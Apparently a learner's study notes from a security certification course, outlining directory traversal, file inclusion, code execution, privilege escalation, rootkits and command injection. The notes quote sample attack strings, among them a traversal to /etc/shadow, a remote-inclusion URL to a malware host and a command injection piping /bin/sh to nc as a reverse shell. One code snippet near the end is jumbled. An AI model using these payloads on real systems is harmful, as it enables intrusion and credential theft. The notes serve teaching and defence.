- Defenses: input validation, least privilege 
- **Directory Traversal:** a type of injection attack that allows access to commands, files, and directories, either connected to web document root directory or not
	- `http://diontraining.com/../../../../etc/shadow`
	- Unix systems use `../`, Windows systems use `..\` and accepts `../`
	- *Directory Traversals* may be used to access any file on a system with the right permissions
	- **Warning!:** attackers may hide directory traversal attempts by using `%2e%2e%2f` to represent `../`
- **File Inclusion:** allows an attacker to either download files from an arbitrary location or upload an executable or script file to open a backdoor
	- **Remote File Inclusion:** occurs when an attacker tries to execute a script to inject a remote file
		- `https://diontraining.com/login.php?user=http://malware.bad/malicious.php`
	- **Local File Inclusion:** occurs when an attacker tries to add a file that already exists
		- `https://diontraining.com/login.php?user=../../Windows/system32/cmd.exe%00`
- logs containing `../` pertain to directory traversals!

- **Arbitrary Code Execution:** a vulnerability that allows an attacker to run a code or module that exploits a vulnerability
- **Remote Code Execution:** a type of arbitrary code execution that allows an attacker to transmit code from a remote host
- **Privilege Escalation:** occurs when a user accesses or modifies specific resources that they are not entitled to normally access
	- **Vertical Privilege Escalation:** from normal level user to a higher level
	- **Horizontal Privilege Escalation:** from one user to another of generally the same level
	- applications must have privileges to read and write data and execute functions
	- the arbitrary code inserted in a program is going to take the privileges of whoever is running that program
- **Rootkit:** a class of malware that modifies system files, often at the kernel level, to conceal its presence
	- Kernel Mode, User Mose
	- Kernel Mode rootkits are able to gain complete control over a system, being in ring zero

```
string ldapSearch = "(cn = $searchName")";
System.out.println(ldapSearch);
```		- input validation, input sanitization
	- **Command Injection:** a threat actor is able to execute arbitrary shell commands via a vulnerable web application
		- `diontraining.com && hostname`
		- `diontraining.com && /bin/sh | nc hacked.diontraining.com 443
